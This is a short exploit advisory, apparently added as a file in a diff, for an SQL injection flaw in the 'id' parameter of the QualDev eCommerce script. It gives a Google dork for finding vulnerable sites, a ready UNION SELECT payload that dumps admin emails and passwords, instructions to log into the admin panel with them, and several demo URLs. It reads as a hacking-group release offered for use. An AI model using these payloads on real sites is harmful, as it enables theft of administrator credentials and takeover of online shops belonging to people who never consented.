@@ -1,0 +1,45 @@
+====================================================
+QualDev eCommerce script SQL injection vulnerability
+====================================================
+
+
+# Exploit Title: QualDev eCommerce script SQL injection vulnerability
+# Vendor: http://www.qualdev.com
+# Date: 15.12.2010
+# Version: all version
+# Category:: webapps
+# Google dork: inurl:"index.php?file=allfile"
+# Tested on: FreeBSD 7.1
+# Author: ErrNick
+# Site: XakNet.ru, forum.xaknet.ru
+# Contact: errnick[at]xaknet[dot]ru
+# Greatz 2 all memberz of XakNet team ( X1mk0~, Saint, baltazar, SHYLLER,
+Kronus, mst && others)
+
+# Intro:
+
+- A parameter is not properly sanitised before  being used in a SQL query.
+- Input  passed   to   "id"  parameter  is  not  properly
+- sanitised before being used in a SQL query.  This  can be
+- exploited  to  manipulate  SQL   queries   by   injecting
+- arbitrary SQL code.
+
+# Exploit:
+
+
+index.php?file=allfile&id=-9999+union+select+1,2,3,concat_ws(0x3a,vemail,vpassword),5,6,7+from+admin
+
+  logining with admin email && password there
+  http://victim/adminpanel/
+
+#Demo:
+
+-
+http://www.site.com/index.php?file=allfile&id=-40+union+select+1,2,3,concat_ws(0x3a,vemail,vpassword),5,6,7+from+admin
+-
+http://www.site.com/index.php?file=allfile&id=-9999+union+select+1,2,3,concat_ws(0x3a,vemail,vpassword),5,6,7+from+admin
+-
+http://www.site.com/index.php?file=allfile&id=-9999+union+select+1,2,3,concat_ws(0x3a,vemail,vpassword),5,6,7+from+admin
+
+
+Vizit us at http://xaknet.ru
